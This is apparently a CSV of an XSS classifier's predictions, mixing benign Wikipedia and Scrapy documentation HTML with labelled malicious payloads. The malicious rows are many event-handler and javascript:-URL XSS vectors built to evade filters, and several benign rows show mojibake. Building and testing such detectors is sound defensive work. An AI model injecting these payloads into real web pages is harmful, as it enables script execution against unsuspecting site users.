payload,true_label,predicted_label,reason
	 </span> 2007 ,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<p>The ch as reasoning and logic. The functional model refers to the correlating data to its computed counterpart.<sup id=""cite_ref-87"" class=""reference""><a href=""#cite_note-87"">&#91;84&#93; </a> </sup> consist of particular traits or capabilities that researchers expect an intelligent system to display. The traits described below have received the most attention.<sup id=""cite_ref-Problems_of_AI_15-2"" class=""reference""><a href=""#cite_note-Problems_of_AI-15"">&#91;15&#93; </a> </sup>",0,0,"Scores: {'benign': 1.6532, 'malicious': 0.0000}"
	 </span>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/overview.html"">Scrapy at a glance</a></li>",0,0,"Scores: {'benign': 1.9612, 'malicious': 0.0000}"
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;600??04 </li> </ul>",0,0,"Scores: {'benign': 1.9842, 'malicious': 0.0000}"
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9644}"
"<li><cite id=""CITEREFMcCorduck2004"" class=""citation""><a href=""/wiki/Pamela_McCorduck"" title=""Pamela McCorduck"">McCorduck, Pamela </a> (2004), <a rel=""nofollow"" class=""external text"" href=""http://www.pamelamc.com/html/machines_who_think.html""><i>Machines Who Think </i> </a> (2nd ed.), Natick, MA: A. K. Peters, Ltd., <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/1-56881-205-1"" title=""Special:BookSources/1-56881-205-1""><bdi>1-56881-205-1 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Machines+Who+Think&amp;rft.place=Natick%2C+MA&amp;rft.edition=2nd&amp;rft.pub=A.+K.+Peters%2C+Ltd.&amp;rft.date=2004&amp;rft.isbn=1-56881-205-1&amp;rft.aulast=McCorduck&amp;rft.aufirst=Pamela&amp;rft_id=http%3A%2F%2Fwww.pamelamc.com%2Fhtml%2Fmachines_who_think.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,"Scores: {'benign': 1.7768, 'malicious': 0.0000}"
"<label onmouseup=""alert(1)"">test</label>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9560}"
	 </span></p>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<li id=""cite_note-Multi-agent_planning-114""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Multi-agent_planning_114-0"">^ </a> </b> ",0,0,"Scores: {'benign': 1.9040, 'malicious': 0.0000}"
	 </span> ,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
<svg><animate onend=alert(1) attributeName=x dur=1s>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9731}"
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9737}"
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9309}"
 ,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
 </li>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9921}"
"<li><a href=""/wiki/Progress_in_artificial_intelligence"" title=""Progress in artificial intelligence"">Progress in artificial intelligence </a> </li>",0,0,"Scores: {'benign': 1.9963, 'malicious': 0.0000}"
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9636}"
"<span draggable=""true"" ondragleave=""alert(1)"">test</span>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9660}"
"<li id=""cite_note-49""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-49"">^ </a> </b> ",0,0,"Scores: {'benign': 1.9663, 'malicious': 0.0000}"
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;113??32 </li>",0,0,"Scores: {'benign': 1.9926, 'malicious': 0.0000}"
"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;193??96 </li>",0,0,"Scores: {'benign': 1.9680, 'malicious': 0.0000}"
"<li id=""cite_note-FOOTNOTEO&#39;BrienMarakas2011-286""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEO&#39;BrienMarakas2011_286-0"">^ </a> </b> ",0,0,"Scores: {'benign': 1.8720, 'malicious': 0.0000}"
<svg><bdo onload=alert(1)></bdo>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9227}"
"<rp onkeyup=""alert(1)"" contenteditable>test</rp>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9673}"
"<blockquote onmouseup=""alert(1)"">test</blockquote>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9668}"
"<param onmouseleave=""alert(1)"">test</param>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9793}"
"<h1 onclick=""alert(1)"">test</h1>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9424}"
"<li><a href=""/wiki/Adam_Tooze"" title=""Adam Tooze"">Tooze, Adam </a>, ""Democracy and Its Discontents"", <i><a href=""/wiki/The_New_York_Review_of_Books"" title=""The New York Review of Books"">The New York Review of Books </a> </i>, vol. LXVI, no. 10 (6 June 2019), pp.&#160;52??3, 56??7.  ""Democracy has no clear answer for the mindless operation of <a href=""/wiki/Bureaucracy"" title=""Bureaucracy"">bureaucratic </a> and <a href=""/wiki/Technology"" title=""Technology"">technological power </a>.  We may indeed be witnessing its extension in the form of artificial intelligence and <a href=""/wiki/Robotics"" title=""Robotics"">robotics </a>.  Likewise, after decades of dire warning, the <a href=""/wiki/Environmentalism"" title=""Environmentalism"">environmental problem </a> remains fundamentally unaddressed.... Bureaucratic overreach and environmental catastrophe are precisely the kinds of slow-moving existential challenges that democracies deal with very badly.... Finally, there is the threat du jour:  <a href=""/wiki/Corporation"" title=""Corporation"">corporations </a> and the technologies they promote.""  (pp.&#160;56??7.) </li> </ul>",0,0,"Scores: {'benign': 1.6605, 'malicious': 0.0000}"
"          <dd><a href=""/en/2.0/"">2.0</a></dd>",0,0,"Scores: {'benign': 1.9781, 'malicious': 0.0000}"
"<li><img alt=""List-Class article"" src=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/16px-Symbol_list_class.svg.png"" decoding=""async"" title=""List-Class article"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/23px-Symbol_list_class.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/31px-Symbol_list_class.svg.png 2x"" data-file-width=""180"" data-file-height=""185"" /> <b><a href=""/wiki/List_of_emerging_technologies"" title=""List of emerging technologies"">List of emerging technologies </a> </b> </li> </ul>",0,0,"Scores: {'benign': 1.8708, 'malicious': 0.0000}"
"<template onmouseup=""alert(1)"">test</template>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9596}"
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationstart=""alert(1)""></rt>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9834}"
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Kermany, D; Goldbaum, M; Zhang, Kang (2018). <a rel=""nofollow"" class=""external text"" href=""https://www.cell.com/action/captchaChallenge?redirectUri=%2Fcell%2Fpdf%2FS0092-8674%2818%2930154-5.pdf"">""Identifying Medical Diagnoses and Treatable Diseases by Image-Based Deep Learning"" </a> <span class=""cs1-format"">(PDF) ",0,0,"Scores: {'benign': 1.7389, 'malicious': 0.0000}"
<svg><textarea onload=alert(1)></textarea>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9159}"
<th id=x tabindex=1 onactivate=alert(1)></th>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9944}"
<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9418}"
	 </span></a></dt><dd>Understand the Scrapy architecture.</dd>,0,0,"Scores: {'benign': 1.9420, 'malicious': 0.0000}"
<ins onpointermove=alert(1)>XSS</ins>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9808}"
 </li>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<details onclick=""alert(1)"">test</details>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9171}"
	 </span>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9767}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9796}"
"<div id=""p-variants"" role=""navigation"" class=""vectorMenu emptyPortlet"" aria-labelledby=""p-variants-label"">",0,0,"Scores: {'benign': 1.8932, 'malicious': 0.0000}"
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9844}"
"<noframes onmouseenter=""alert(1)"">test</noframes>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9685}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9640}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
<select onpointerout=alert(1)>XSS</select>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9707}"
"<embed onmouseover=""alert(1)"">test</embed>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9710}"
"<span oncopy=""alert(1)"" contenteditable>test</span>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9434}"
 </p>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2F09540090310001655110"">10.1080/09540090310001655110 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Connection+Science&amp;rft.atitle=Developmental+robotics%3A+a+survey&amp;rft.volume=15&amp;rft.issue=4&amp;rft.pages=151-190&amp;rft.date=2003&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.83.7615&amp;rft_id=info%3Adoi%2F10.1080%2F09540090310001655110&amp;rft.aulast=Lungarella&amp;rft.aufirst=M.&amp;rft.au=Metta%2C+G.&amp;rft.au=Pfeifer%2C+R.&amp;rft.au=Sandini%2C+G.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,"Scores: {'benign': 1.8010, 'malicious': 0.0000}"
"<li><a href=""/wiki/Jason_Jixuan_Hu"" title=""Jason Jixuan Hu"">Jason Jixuan Hu </a> </li>",0,0,"Scores: {'benign': 1.7833, 'malicious': 0.0000}"
          </dd>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<span onbeforepaste=""alert(1)"" contenteditable>test</span>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9619}"
<iframe src=http://.rocks/scriptlet.html <,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.8240}"
"<ul><li><a href=""/wiki/Type_physicalism"" title=""Type physicalism"">identity theory </a> </li> </ul> </li>",0,0,"Scores: {'benign': 1.8237, 'malicious': 0.0000}"
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9576}"
"<ul><li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;509??30, </li>",0,0,"Scores: {'benign': 1.9854, 'malicious': 0.0000}"
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9919}"
"Moving and <a href=""/wiki/Configuration_space_(physics)"" title=""Configuration space (physics)"">configuration space </a>:",0,0,"Scores: {'benign': 1.7441, 'malicious': 0.0000}"
"  Built with <a href=""http://sphinx-doc.org/"">Sphinx</a> using a <a href=""https://github.com/rtfd/sphinx_rtd_theme"">theme</a> provided by <a href=""https://readthedocs.org"">Read the Docs</a>. ",0,0,"Scores: {'benign': 1.8281, 'malicious': 0.0000}"
 </p>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
<multicol onpointerenter=alert(1)>XSS</multicol>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9785}"
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9854}"
<sub id=x tabindex=1 onfocus=alert(1)></sub>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9687}"
"          <dd><a href=""/en/0.24/"">0.24</a></dd>",0,0,"Scores: {'benign': 1.9692, 'malicious': 0.0000}"
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(1)""></html>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9860}"
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></th>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9994}"
"<bdi onmousedown=""alert(1)"">test</bdi>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9703}"
"<ul><li><a href=""/wiki/Technological_unemployment"" title=""Technological unemployment"">Technological unemployment </a> </li>",0,0,"Scores: {'benign': 1.7917, 'malicious': 0.0000}"
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<link draggable=""true"" ondrag=""alert(1)"">test</link>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9722}"
"<li><a href=""/wiki/Computer_vision"" title=""Computer vision"">Computer vision </a> </li>",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
	 <div> </div> </td> </tr> </tbody> </table>,0,0,"Scores: {'benign': 1.9859, 'malicious': 0.0000}"
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9885}"
"<image onbeforepaste=""alert(1)"" contenteditable>test</image>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9764}"
"<wbr draggable=""true"" ondragend=""alert(1)"">test</wbr>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9575}"
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationstart=""alert(1)""></fieldset>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9786}"
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9879}"
"<li><a href=""/wiki/Emergentism"" title=""Emergentism"">Emergentism </a> </li>",0,0,"Scores: {'benign': 1.9422, 'malicious': 0.0000}"
<body onpointerover=alert(1)>XSS</body>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9702}"
<code onpointerdown=alert(1)>XSS</code>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9872}"
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></wbr>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9932}"
"<font onbeforecut=""alert(1)"" contenteditable>test</font>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9524}"
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Other </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,"Scores: {'benign': 1.9268, 'malicious': 0.0000}"
"<li><a href=""/wiki/Fitness_function"" title=""Fitness function"">Fitness function </a> </li>",0,0,"Scores: {'benign': 1.9316, 'malicious': 0.0000}"
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;424??33, </li>",0,0,"Scores: {'benign': 1.9916, 'malicious': 0.0000}"
	 </span>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
	 </span>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9612}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"        <a href=""intro/overview.html"" class=""btn btn-neutral float-right"" title=""Scrapy at a glance"" accesskey=""n"" rel=""next"">Next <span class=""fa fa-arrow-circle-right"">",0,0,"Scores: {'benign': 1.8904, 'malicious': 0.0000}"
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9548}"
"<template draggable=""true"" ondragenter=""alert(1)"">test</template>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9498}"
	 </span> </h3>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<p>Interest in <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">neural networks </a> and ""<a href=""/wiki/Connectionism"" title=""Connectionism"">connectionism </a>"" was revived by <a href=""/wiki/David_Rumelhart"" title=""David Rumelhart"">David Rumelhart </a> and others in the middle of the 1980s.<sup id=""cite_ref-Revival_of_connectionism_172-0"" class=""reference""><a href=""#cite_note-Revival_of_connectionism-172"">&#91;169&#93; </a> </sup> <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">Artificial neural networks </a> are an example of <a href=""/w/index.php?title=Soft_computing&amp;action=edit&amp;redlink=1"" class=""new"" title=""Soft computing (page does not exist)"">soft computing </a>??they are solutions to problems which cannot be solved with complete logical certainty, and where an approximate solution is often sufficient. Other <a href=""/w/index.php?title=Soft_computing&amp;action=edit&amp;redlink=1"" class=""new"" title=""Soft computing (page does not exist)"">soft computing </a> approaches to AI include <a href=""/wiki/Fuzzy_system"" class=""mw-redirect"" title=""Fuzzy system"">fuzzy systems </a>, <a href=""/wiki/Grey_system_theory"" class=""mw-redirect"" title=""Grey system theory"">Grey system theory </a>, <a href=""/wiki/Evolutionary_computation"" title=""Evolutionary computation"">evolutionary computation </a> and many statistical tools. The application of soft computing to AI is studied collectively by the emerging discipline of <a href=""/wiki/Computational_intelligence"" title=""Computational intelligence"">computational intelligence </a>.<sup id=""cite_ref-Computational_intelligence_173-0"" class=""reference""><a href=""#cite_note-Computational_intelligence-173"">&#91;170&#93; </a> </sup>",0,0,"Scores: {'benign': 1.6841, 'malicious': 0.0000}"
"<noembed onkeypress=""alert(1)"" contenteditable>test</noembed>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9667}"
"<spacer onkeydown=""alert(1)"" contenteditable>test</spacer>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9677}"
"	 </span> <span class=""toctext"">Symbolic ",0,0,"Scores: {'benign': 1.9362, 'malicious': 0.0000}"
"<li><a href=""/wiki/Biomedical_cybernetics"" title=""Biomedical cybernetics"">Biomedical cybernetics </a> </li>",0,0,"Scores: {'benign': 1.9219, 'malicious': 0.0000}"
"<li><a href=""#CITEREFMoravec1988"">Moravec 1988 </a>, p.&#160;3 </li> </ul>",0,0,"Scores: {'benign': 1.9912, 'malicious': 0.0000}"
"	 <div style=""padding:0em 0.25em"">",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<li class=""toclevel-2 tocsection-39""><a href=""#Cybersecurity""><span class=""tocnumber"">7.4 ",0,0,"Scores: {'benign': 1.8028, 'malicious': 0.0000}"
"<del onmouseup=""alert(1)"">test</del>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9609}"
"<li><a href=""/wiki/Philosophy_of_artificial_intelligence"" title=""Philosophy of artificial intelligence"">Philosophy of artificial intelligence </a> </li>",0,0,"Scores: {'benign': 1.9529, 'malicious': 0.0000}"
"<q onpaste=""alert(1)"" contenteditable>test</q>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9752}"
"<summary onbeforecopy=""alert(1)"" contenteditable>test</summary>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9627}"
"<samp draggable=""true"" ondragenter=""alert(1)"">test</samp>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9665}"
"    <input type=""hidden"" name=""area"" value=""default"" />",0,0,"Scores: {'benign': 1.8806, 'malicious': 0.0000}"
	 </span> </li>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<dt onmouseup=""alert(1)"">test</dt>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9487}"
"<li id=""cite_note-292""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-292"">^ </a> </b> ",0,0,"Scores: {'benign': 1.9692, 'malicious': 0.0000}"
"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9841}"
<article onpointerenter=alert(1)>XSS</article>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9733}"
"<meter onbeforepaste=""alert(1)"" contenteditable>test</meter>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9636}"
<svg><menuitem onload=alert(1)></menuitem>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9050}"
"<IMG SRC=""jav&#x09;ascript:alert('');"">",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9955}"
 ,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"Second <a href=""/wiki/AI_winter"" title=""AI winter"">AI winter </a>:",0,0,"Scores: {'benign': 1.8867, 'malicious': 0.0000}"
	 </span></a></dt><dd>Customize how pages get requested and downloaded.</dd>,0,0,"Scores: {'benign': 1.8181, 'malicious': 0.0000}"
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/settings.html"">Settings</a></li>",0,0,"Scores: {'benign': 1.9467, 'malicious': 0.0000}"
<del onpointerenter=alert(1)>XSS</del>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9638}"
        <dt>On Read the Docs</dt>,0,0,"Scores: {'benign': 1.7369, 'malicious': 0.0000}"
"<style oncontextmenu=""alert(1)"">test</style>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9234}"
"  <form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">",0,0,"Scores: {'benign': 1.8753, 'malicious': 0.0000}"
<s id=x tabindex=1 onfocusin=alert(1)></s>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9890}"
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9959}"
"	 <div style=""padding:0em 0.25em"">",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"  <div class=""wy-grid-for-nav"">",0,0,"Scores: {'benign': 1.8929, 'malicious': 0.0000}"
"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9868}"
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9521}"
"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9606}"
	 </span> </li>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<li><img alt=""WikiProject"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/16px-People_icon.svg.png"" decoding=""async"" title=""WikiProject"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/24px-People_icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/32px-People_icon.svg.png 2x"" data-file-width=""100"" data-file-height=""100"" /><b><a href=""/wiki/Wikipedia:WikiProject_Computer_science"" title=""Wikipedia:WikiProject Computer science"">WikiProject </a> </b> </li>",0,0,"Scores: {'benign': 1.8492, 'malicious': 0.0000}"
<data id=x tabindex=1 onbeforeactivate=alert(1)></data>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9666}"
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9705}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<li><a href=""/wiki/Glossary_of_robotics"" title=""Glossary of robotics"">Robotics </a> </li>",0,0,"Scores: {'benign': 1.9595, 'malicious': 0.0000}"
"<template onmouseenter=""alert(1)"">test</template>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9613}"
"<dd onmouseenter=""alert(1)"">test</dd>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9653}"
"<li><a href=""/wiki/Elon_Musk"" title=""Elon Musk"">Elon Musk </a> </li>",0,0,"Scores: {'benign': 1.7959, 'malicious': 0.0000}"
<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9686}"
 </p>,0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, p.&#160;153 </li>",0,0,"Scores: {'benign': 1.9623, 'malicious': 0.0000}"
" </tr><tr><th style=""padding:0.1em"">",0,0,"Scores: {'benign': 2.0000, 'malicious': 0.0000}"
"<figure onmouseout=""alert(1)"">test</figure>",1,1,"Scores: {'benign': 0.0000, 'malicious': 1.9779}"
"<li><a href=""/wiki/Multimedia_database"" title=""Multimedia database"">Multimedia information system </a> </li>",0,0,"Scores: {'benign': 1.9078, 'malicious': 0.0000}"
